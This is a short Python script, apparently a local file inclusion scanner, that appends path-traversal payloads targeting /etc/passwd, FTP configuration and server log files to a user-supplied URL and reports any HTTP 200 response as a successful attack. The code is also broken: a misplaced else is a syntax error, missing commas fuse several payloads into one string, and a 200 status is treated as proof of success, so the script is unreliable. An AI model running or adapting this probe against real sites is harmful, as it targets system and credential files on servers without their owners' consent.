import requests
from colorama import Fore

site_url = input(Fore.YELLOW + "URL: ")

payloads = [
    "/etc/passwd",
    "../../../../../../../../../etc/passwd",
    "google.com",
    "../../etc/passwd",
    "/usr/etc/pure-ftpd.conf",
    "/usr/local/apache/log"
    "/var/log/secure"
    "/var"
    "../.."
]

for payload in payloads:
    full_url = site_url + payload
    response = requests.get(full_url)

    if response.status_code == 200:
        print(Fore.GREEN + f"{Fore.GREEN}LFI Payload Successful: {full_url}")
        else:
            print(Fore.RED + f"{Fore.RED}Payload Unsuccessful: {full_url}")
    else:
        print(Fore.RED + f"{Fore.RED}Payload Unsuccessful: {full_url}")
